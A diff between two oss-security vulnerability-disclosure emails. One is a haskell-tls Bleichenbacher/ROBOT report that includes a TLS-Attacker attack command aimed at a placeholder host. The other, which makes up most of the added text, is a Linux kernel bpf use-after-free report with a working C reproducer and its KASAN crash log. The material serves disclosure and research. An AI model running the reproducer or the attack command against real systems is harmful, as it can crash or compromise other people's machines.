@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2025" "Saturday" "15" "September" "2018" "16:07:58" "+0200" "Hanno =?UTF-8?B?QsO2Y2s=?=" "hanno@hboeck.de" "<20180915160758.70024031@computer>" "50" "[oss-security] haskell-tls: Inconsistencies in answers to RSA errors (possiby Bleichenbacher/ROBOT attack)" nil nil nil "9" "2018091514:07:58" "[oss-security] haskell-tls: Inconsistencies in answers to RSA errors (possiby Bleichenbacher/ROBOT attack)" (number mark "U       hanno@hboeck Sep 15   50/2025  " thread-indent "\"[oss-security] haskell-tls: Inconsistencies in answers to RSA errors (possiby Bleichenbacher/ROBOT attack)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["8233" "Thursday" "12" "May" "2016" "15:59:11" "+0800" "Marco Grassi" "marco.gra@gmail.com" "<CAFkTriLitb9v4MZn5b2HV9HGpu6VWHifgR3VZhDYoQwjGyaWBg@mail.gmail.com>" "220" "[oss-security] Linux Kernel bpf related UAF" nil nil nil "5" "2016051207:59:11" "[oss-security] Linux Kernel bpf related UAF" (number mark "U       marco.gra@gm May 12  220/8233  " thread-indent "\"[oss-security] Linux Kernel bpf related UAF\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 17589 invoked by uid 550); 15 Sep 2018 14:08:08 -0000
+Received: (qmail 32658 invoked by uid 550); 12 May 2016 11:24:15 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,65 +12,255 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 17551 invoked from network); 15 Sep 2018 14:08:08 -0000
-Date: Sat, 15 Sep 2018 16:07:58 +0200
-From: Hanno =?UTF-8?B?QsO2Y2s=?= <hanno@hboeck.de>
-To: oss-security@lists.openwall.com
-Message-ID: <20180915160758.70024031@computer>
-X-Mailer: Claws Mail 3.17.1 (GTK+ 2.24.32; x86_64-pc-linux-gnu)
+Received: (qmail 7914 invoked from network); 12 May 2016 07:59:23 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20120113;
+        h=mime-version:date:message-id:subject:from:to;
+        bh=COYwQwDXF/i28DIsn5WB8UqJl1pnDUA8G/gszulFdrE=;
+        b=LmvV3X4HE6mJfsCwpKelp4J6QxqLu/MlA/UvDqsaALOMZw+IzaL4mFTHJXEnan97jh
+         ncgv54K2HXOX93e2AHkuP6HWB1m9kiyO5GCHw2TcVMrAfKBFOE0ii7kU95laKmKqOTSq
+         VjRLhOoljI5ZbStQSDkzc5FjSkswFc5UHJLtWzyQzuaGVGcB+FPTEW/5AzVj3QU2Ok0R
+         P8d3dALtcZKcOncoqBkF8qvKiUS7GaohLqmSvbNJrCL9v8nVhL8b56ZXzA7QqDfxGhv7
+         kQKi4FhBsjIxfiwJv6Fd3vDk2+NCYSU2qPYorSA1yiA2TzXod21/Sjt7YwemRl3qtGKT
+         StsA==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20130820;
+        h=x-gm-message-state:mime-version:date:message-id:subject:from:to;
+        bh=COYwQwDXF/i28DIsn5WB8UqJl1pnDUA8G/gszulFdrE=;
+        b=lQwLoTiLv0rKvYn9fOy5gE7GbFfXeNdlRxLgW7YgVtQMsIl8cndhv7fA4g9kqTm49K
+         jIdA84A2v7V3JNKd5YUNzUVGWcbTyaYcZyvvgxpYVi2jjarQAjZkUsHfwK27Nk5tlzF6
+         VrYn1X79X55fVcBLKlTR5TFe+mL78KQGXBUo9nR2zcwAc6gf9j6KkszmCJKEpi5CjNaQ
+         w18T6ITGVZXw7vQScH2UaObx5p0vNLXzlnJPIL68B7w+1w9GL3oXXiohD+XLXPk8Lv6A
+         tGfiCNVn9Uv5ml7SBJQ4YXwdN5ntADgDpMgKLVadI075IcDVLpZGag7FhB1ZcEkOOCnt
+         MP1A==
+X-Gm-Message-State: AOPr4FUxV5e88QQyuYrs42v02RuSrlRC2qq2xKRFRB6Hf53J9FJ2MxVMzAR7k/otwMToNqiDUmRWnUaghILXqA==
 MIME-Version: 1.0
+X-Received: by 10.157.55.203 with SMTP id x69mr4195860otb.57.1463039951296;
+ Thu, 12 May 2016 00:59:11 -0700 (PDT)
+Date: Thu, 12 May 2016 15:59:11 +0800
+Message-ID: <CAFkTriLitb9v4MZn5b2HV9HGpu6VWHifgR3VZhDYoQwjGyaWBg@mail.gmail.com>
+From: Marco Grassi <marco.gra@gmail.com>
+To: oss-security@lists.openwall.com
+Content-Type: multipart/alternative; boundary=001a113f192496dd870532a088c2
+Subject: [oss-security] Linux Kernel bpf related UAF
+
+--001a113f192496dd870532a088c2
 Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: quoted-printable
-Subject: [oss-security] haskell-tls: Inconsistencies in answers to RSA errors (possiby
- Bleichenbacher/ROBOT attack)
 
-One of the leftovers of our ROBOT/Bleichenbacher research was that we
-discovered some inconsistencies in haskell-tls, however they only
-appear in special situations (AES256-CBC modes) and not reliably.
-I've been asked by the haskell-tls author to report it to the public
-bug tracker, so I believe it's no longer secret.
+Hi,
 
-https://github.com/vincenthz/hs-tls/issues/285
+the following reproducer will cause a UAF of a previously allocated memory
+in bpf.
 
-----------------------
+You can reproduce with linux kernel master, or 4.6-rc6 4.6-rc7 and maybe
+other kernel versions.
 
-Last year we published research that several TLS implementations were
-still vulnerable to the classic "Bleichenbacher" attack from 1998 and
-named it the ROBOT attack [1].
+In the reproducer there is also a log of the UAF with KASAN of the kernel
+running on qemu x64
 
-While analyzing several implementations we also figured out
-inconsistencies with haskell-tls, but as we couldn't really make sense
-of them we haven't analyzed them in more detail.
+Thanks
 
-We observe that in some situations as a response to faulty RSA
-encryption packages a haskell tls server will answer with an internal
-server error instead of a bad_record_mac error. The behavior is
-inconsistent, so we're not sure this can be turned into a practical
-attack. Yet it's still definitely a bug and potentially a vulnerability.
+Marco
 
-This only happens with ciphers with AES256 and CBC mode. (Which is also
-why our detection script and many other detection tools that are based
-on it will not see it, as they often will just test with AES128.)
+Reproducer C file:
+==================
 
-It was originally pointed out to us by Hubert Kario (he's the developer
-of tls-fuzzer, which will show errors if you run its bleichenbacher
-check [2] against a haskell tls server). Another tool that's capable of
-detecting the error is TLS-Attacker, which is by one of ROBOT's
-co-authors [3].
+// Linux kernel version: 4.6-rc7 or 4.6-rc6, or linux master (tested
+2016/05/12) compiled with KASAN to see the log
+// Compile it with gcc -o durr durr.c
+// Run it and it will cause the UAF endlessly see qemu logs dmesg/logs
+// here there is a example log
 
-A test run would be something like this:
-java -jar Attacks.jar -loglevel DEBUG bleichenbacher -connect [host]
--cipher TLS_RSA_WITH_AES_256_CBC_SHA
+/*
+[  228.998319]
+==================================================================
+[  228.999029] BUG: KASAN: use-after-free in
+pcpu_extend_area_map+0x111/0x130 at addr ffff88006785d47c
+[  228.999833] Read of size 4 by task durr/5570
+[  229.000219]
+=============================================================================
+[  229.000943] BUG kmalloc-192 (Tainted: G    B          ): kasan: bad
+access detected
+[  229.001619]
+-----------------------------------------------------------------------------
+[  229.001619]
+[  229.002485] INFO: Allocated in 0xbbbbbbbbbbbbbbbb
+age=18446720155036662370 cpu=0 pid=0
+[  229.003198]  pcpu_mem_zalloc+0x56/0xa0
+[  229.003542]  ___slab_alloc.constprop.60+0x3f9/0x440
+[  229.003995]  __slab_alloc.constprop.59+0x20/0x40
+[  229.004426]  __kmalloc+0x20b/0x240
+[  229.004749]  pcpu_mem_zalloc+0x56/0xa0
+[  229.005102]  pcpu_create_chunk+0x23/0x490
+[  229.005478]  pcpu_alloc+0xa42/0xbc0
+[  229.005806]  __alloc_percpu_gfp+0x2c/0x40
+[  229.006179]  array_map_alloc+0x52b/0x6e0
+[  229.006548]  SyS_bpf+0x6ee/0x1800
+[  229.006868]  entry_SYSCALL_64_fastpath+0x1a/0xa4
+[  229.007302] INFO: Freed in 0xffffba5f age=18446738129474796130 cpu=0
+pid=0
+[  229.007934]  kvfree+0x3b/0x60
+[  229.008220]  __slab_free+0x1df/0x2e0
+[  229.008561]  kfree+0x176/0x190
+[  229.008847]  kvfree+0x3b/0x60
+[  229.009127]  pcpu_balance_workfn+0x755/0xe10
+[  229.009527]  process_one_work+0x882/0x12d0
+[  229.009905]  worker_thread+0xe4/0x1300
+[  229.010251]  kthread+0x1fb/0x280
+[  229.010553]  ret_from_fork+0x22/0x40
+[  229.010891] INFO: Slab 0xffffea00019e1700 objects=15 used=9
+fp=0xffff88006785d048 flags=0x4000000000004080
+[  229.011771] INFO: Object 0xffff88006785d450 @offset=5200
+fp=0xbbbbbbbbbbbbbbbb
+[  229.011771]
+[  229.012562] Redzone ffff88006785d448: 00 00 00 00 00 00 00 00
+               ........
+[  229.013356] Object ffff88006785d450: bb bb bb bb bb bb bb bb 00 00 00 00
+00 00 00 00  ................
+[  229.014194] Object ffff88006785d460: 58 d4 3c 6b 00 88 ff ff 00 00 20 00
+00 00 20 00  X.<k...... ... .
+[  229.015033] Object ffff88006785d470: 00 00 e0 fa ff e8 ff ff 01 00 00 00
+00 01 00 00  ................
+[  229.015869] Object ffff88006785d480: 08 80 87 65 00 88 ff ff e0 ff ff ff
+0f 00 00 00  ...e............
+[  229.016702] Object ffff88006785d490: 90 d4 85 67 00 88 ff ff 90 d4 85 67
+00 88 ff ff  ...g.......g....
+[  229.017534] Object ffff88006785d4a0: e0 8a 49 81 ff ff ff ff a8 52 92 67
+00 88 ff ff  ..I......R.g....
+[  229.018368] Object ffff88006785d4b0: 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00  ................
+[  229.019215] Object ffff88006785d4c0: 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00  ................
+[  229.020056] Object ffff88006785d4d0: 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00  ................
+[  229.020901] Object ffff88006785d4e0: 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00  ................
+[  229.021745] Object ffff88006785d4f0: 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00  ................
+[  229.022587] Object ffff88006785d500: 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00  ................
+[  229.023431] Redzone ffff88006785d510: 00 00 00 00 00 00 00 00
+               ........
+[  229.024219] Padding ffff88006785d648: 61 ba ff ff 00 00 00 00
+               a.......
+[  229.025029] CPU: 0 PID: 5570 Comm: durr Tainted: G    B
+4.6.0-rc6 #6
+[  229.025681] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS
+Ubuntu-1.8.2-1ubuntu1 04/01/2014
+[  229.026532]  0000000000000000 00000000d3335927 ffff880065e1fb08
+ffffffff81b25fb3
+[  229.027250]  ffff88006785c000 ffff88006785d450 ffff88006cc02a40
+ffffea00019e1700
+[  229.027968]  ffff880065e1fb38 ffffffff815282c5 ffff88006cc02a40
+ffffea00019e1700
+[  229.028682] Call Trace:
+[  229.028917]  [<ffffffff81b25fb3>] dump_stack+0x83/0xb0
+[  229.029389]  [<ffffffff815282c5>] print_trailer+0x115/0x1a0
+[  229.029899]  [<ffffffff8152d144>] object_err+0x34/0x40
+[  229.030370]  [<ffffffff8152f2e6>] kasan_report_error+0x226/0x550
+[  229.030926]  [<ffffffff8152e955>] ? kasan_unpoison_shadow+0x35/0x50
+[  229.031498]  [<ffffffff8152e9ce>] ? kasan_kmalloc+0x5e/0x70
+[  229.032008]  [<ffffffff8152f751>] __asan_report_load4_noabort+0x61/0x70
+[  229.032612]  [<ffffffff81496bf1>] ? pcpu_extend_area_map+0x111/0x130
+[  229.033192]  [<ffffffff81496bf1>] pcpu_extend_area_map+0x111/0x130
+[  229.033755]  [<ffffffff81496f77>] ? pcpu_create_chunk+0x367/0x490
+[  229.034314]  [<ffffffff8149734c>] pcpu_alloc+0x2ac/0xbc0
+[  229.034804]  [<ffffffff814970a0>] ? pcpu_create_chunk+0x490/0x490
+[  229.035358]  [<ffffffff8152e955>] ? kasan_unpoison_shadow+0x35/0x50
+[  229.035929]  [<ffffffff81499879>] ? kmalloc_order+0x59/0x70
+[  229.036438]  [<ffffffff814998b4>] ? kmalloc_order_trace+0x24/0xa0
+[  229.036994]  [<ffffffff8152ad9c>] ? __kmalloc+0x1ec/0x240
+[  229.037486]  [<ffffffff81497c8c>] __alloc_percpu_gfp+0x2c/0x40
+[  229.038018]  [<ffffffff813e832b>] array_map_alloc+0x52b/0x6e0
+[  229.038543]  [<ffffffff813d65ce>] SyS_bpf+0x6ee/0x1800
+[  229.039017]  [<ffffffff810dc37d>] ? __do_page_fault+0x1cd/0xb50
+[  229.039558]  [<ffffffff813d5ee0>] ? bpf_prog_new_fd+0x30/0x30
+[  229.040083]  [<ffffffff810dcda9>] ? trace_do_page_fault+0x79/0x240
+[  229.040649]  [<ffffffff82ba1932>] entry_SYSCALL_64_fastpath+0x1a/0xa4
+[  229.041236] Memory state around the buggy address:
+[  229.041678]  ffff88006785d300: fc fc fc fc fc fc fc fc fc fc fc fc fc fc
+fc fc
+[  229.042331]  ffff88006785d380: fc fc fc fc fc fc fc fc fc fc fc fc fc fc
+fc fc
+[  229.042992] >ffff88006785d400: fc fc fc fc fc fc fc fc fc fc fc fb fb fb
+fb fb
+[  229.043642]
+    ^
+[  229.044286]  ffff88006785d480: fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+fb fb
+[  229.044938]  ffff88006785d500: fb fb fb fc fc fc fc fc fc fc fc fc fc fc
+fc fc
+[  229.045589]
+==================================================================
 
-[1] https://robotattack.org/
-[2]
-https://github.com/tomato42/tlsfuzzer/blob/master/scripts/test-bleichenbach=
-er-workaround.py
-[3] https://github.com/RUB-NDS/TLS-Attacker
+*/
 
---=20
-Hanno B=C3=B6ck
-https://hboeck.de/
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <string.h>
+#include <stdint.h>
+#include <pthread.h>
 
-mail/jabber: hanno@hboeck.de
-GPG: FE73757FA60E4E21B937579FA5880072BBB51E42
+#ifndef SYS_mmap
+#define SYS_mmap 9
+#endif
+#ifndef SYS_bpf
+#define SYS_bpf 321
+#endif
+
+long r[6];
+
+int main(int argc, char **argv)
+{
+    printf("--beginning of program\n");
+
+    while(1) {
+
+        pid_t pid = fork();
+
+        if (pid == 0)
+        {
+            // child process
+            memset(r, -1, sizeof(r));
+            r[0] = syscall(SYS_mmap, 0x20000000ul, 0xf000ul, 0x3ul, 0x32ul,
+0xfffffffffffffffful, 0x0ul);
+            *(uint32_t*)0x20006eea = (uint32_t)0x6;
+            *(uint32_t*)0x20006eee = (uint32_t)0x4;
+            *(uint32_t*)0x20006ef2 = (uint32_t)0x54d1;
+            *(uint32_t*)0x20006ef6 = (uint32_t)0xc93;
+            r[5] = syscall(SYS_bpf, 0x0ul, 0x20006eeaul, 0x10ul, 0, 0, 0);
+            return 0;
+        }
+        else if (pid > 0)
+        {
+            // parent process
+            memset(r, -1, sizeof(r));
+            r[0] = syscall(SYS_mmap, 0x20000000ul, 0xf000ul, 0x3ul, 0x32ul,
+0xfffffffffffffffful, 0x0ul);
+            *(uint32_t*)0x20006eea = (uint32_t)0x6;
+            *(uint32_t*)0x20006eee = (uint32_t)0x4;
+            *(uint32_t*)0x20006ef2 = (uint32_t)0x54d1;
+            *(uint32_t*)0x20006ef6 = (uint32_t)0xc93;
+            r[5] = syscall(SYS_bpf, 0x0ul, 0x20006eeaul, 0x10ul, 0, 0, 0);
+            int returnStatus;
+            waitpid(pid, &returnStatus, 0);
+            printf("collected child\n");
+
+        }
+        else
+        {
+            // fork failed
+            printf("fork() failed!\n");
+            return 1;
+        }
+    }
+
+    printf("--end of program--\n");
+
+    return 0;
+}
+
+=====================
+
+--001a113f192496dd870532a088c2--
